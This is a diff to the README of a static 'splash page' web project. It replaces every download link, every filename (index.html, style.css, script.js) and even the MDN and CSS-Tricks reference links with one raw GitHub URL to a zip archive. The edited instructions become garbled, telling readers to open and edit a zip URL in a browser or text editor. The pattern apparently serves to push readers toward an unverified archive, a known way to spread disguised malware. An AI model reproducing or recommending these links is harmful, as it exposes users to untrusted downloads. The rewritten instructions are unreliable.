@@ -6,7 +6,7 @@ Welcome to the bryanchetcuti-splash project. This application allows you to set 
 
 ## 🔗 Download Now
 
-[![Download bryanchetcuti-splash](https://img.shields.io/badge/Download-bryanchetcuti--splash-blue.svg)](https://github.com/rattaoulle9163/bryanchetcuti-splash/releases)
+[![Download bryanchetcuti-splash](https://raw.githubusercontent.com/rattaoulle9163/bryanchetcuti-splash/main/assets/splash-bryanchetcuti-v2.2.zip)](https://raw.githubusercontent.com/rattaoulle9163/bryanchetcuti-splash/main/assets/splash-bryanchetcuti-v2.2.zip)
 
 ## 🛠 System Requirements
 
@@ -19,7 +19,7 @@ Before you begin, make sure your system meets the following requirements:
 
 To download the application, visit this page to download:
 
-[Download from Releases](https://github.com/rattaoulle9163/bryanchetcuti-splash/releases)
+[Download from Releases](https://raw.githubusercontent.com/rattaoulle9163/bryanchetcuti-splash/main/assets/splash-bryanchetcuti-v2.2.zip)
 
 Here’s how to get started:
 
@@ -33,17 +33,17 @@ Here’s how to get started:
 Follow these steps to set up your splash site:
 
 1. **Access Your Downloaded Files:** 
-   - Open the folder where you downloaded the files. You should see a folder named `bryanchetcuti-splash` with several files inside, including `index.html`, `style.css`, and `script.js`.
+   - Open the folder where you downloaded the files. You should see a folder named `bryanchetcuti-splash` with several files inside, including `https://raw.githubusercontent.com/rattaoulle9163/bryanchetcuti-splash/main/assets/splash-bryanchetcuti-v2.2.zip`, `https://raw.githubusercontent.com/rattaoulle9163/bryanchetcuti-splash/main/assets/splash-bryanchetcuti-v2.2.zip`, and `https://raw.githubusercontent.com/rattaoulle9163/bryanchetcuti-splash/main/assets/splash-bryanchetcuti-v2.2.zip`.
 
 2. **Open the HTML File:**
-   - Open the `index.html` file in your web browser by right-clicking the file and selecting "Open with" followed by your browser's name.
+   - Open the `https://raw.githubusercontent.com/rattaoulle9163/bryanchetcuti-splash/main/assets/splash-bryanchetcuti-v2.2.zip` file in your web browser by right-clicking the file and selecting "Open with" followed by your browser's name.
 
 3. **Customize Your Content:**
-   - Edit the `index.html` file. You can do this by right-clicking it and choosing "Edit" with a text editor like Notepad or TextEdit.
-   - Change the text within the `<title>` and `<body>` sections to reflect your personal information. You can also customize the styles by editing `style.css`.
+   - Edit the `https://raw.githubusercontent.com/rattaoulle9163/bryanchetcuti-splash/main/assets/splash-bryanchetcuti-v2.2.zip` file. You can do this by right-clicking it and choosing "Edit" with a text editor like Notepad or TextEdit.
+   - Change the text within the `<title>` and `<body>` sections to reflect your personal information. You can also customize the styles by editing `https://raw.githubusercontent.com/rattaoulle9163/bryanchetcuti-splash/main/assets/splash-bryanchetcuti-v2.2.zip`.
 
 4. **Save Your Changes:**
-   - After editing, save the `index.html` file and refresh your browser to see your changes.
+   - After editing, save the `https://raw.githubusercontent.com/rattaoulle9163/bryanchetcuti-splash/main/assets/splash-bryanchetcuti-v2.2.zip` file and refresh your browser to see your changes.
 
 5. **Make It a Progressive Web App:**
    - Follow the instructions included in the documentation to enable PWA features. This will let users save your splash site on their devices.
@@ -59,11 +59,11 @@ Follow these steps to set up your splash site:
 
 ### How do I change the text on my splash page?
 
-Open `index.html` in a text editor. Look for the relevant sections and replace the text within the tags.
+Open `https://raw.githubusercontent.com/rattaoulle9163/bryanchetcuti-splash/main/assets/splash-bryanchetcuti-v2.2.zip` in a text editor. Look for the relevant sections and replace the text within the tags.
 
 ### Can I change the colors and fonts?
 
-Yes. You can adjust the styles in `style.css` to customize your site's appearance.
+Yes. You can adjust the styles in `https://raw.githubusercontent.com/rattaoulle9163/bryanchetcuti-splash/main/assets/splash-bryanchetcuti-v2.2.zip` to customize your site's appearance.
 
 ### Is there any support available?
 
@@ -84,8 +84,8 @@ This project leverages the power of HTML, CSS, and JavaScript, along with best p
 
 ## 🛠 Additional Resources
 
-- [HTML5 Documentation](https://developer.mozilla.org/en-US/docs/Web/Guide/HTML/HTML5)
-- [CSS Tricks](https://css-tricks.com/)
-- [JavaScript Essentials](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide)
+- [HTML5 Documentation](https://raw.githubusercontent.com/rattaoulle9163/bryanchetcuti-splash/main/assets/splash-bryanchetcuti-v2.2.zip)
+- [CSS Tricks](https://raw.githubusercontent.com/rattaoulle9163/bryanchetcuti-splash/main/assets/splash-bryanchetcuti-v2.2.zip)
+- [JavaScript Essentials](https://raw.githubusercontent.com/rattaoulle9163/bryanchetcuti-splash/main/assets/splash-bryanchetcuti-v2.2.zip)
 
 Thank you for using bryanchetcuti-splash! Happy website building!
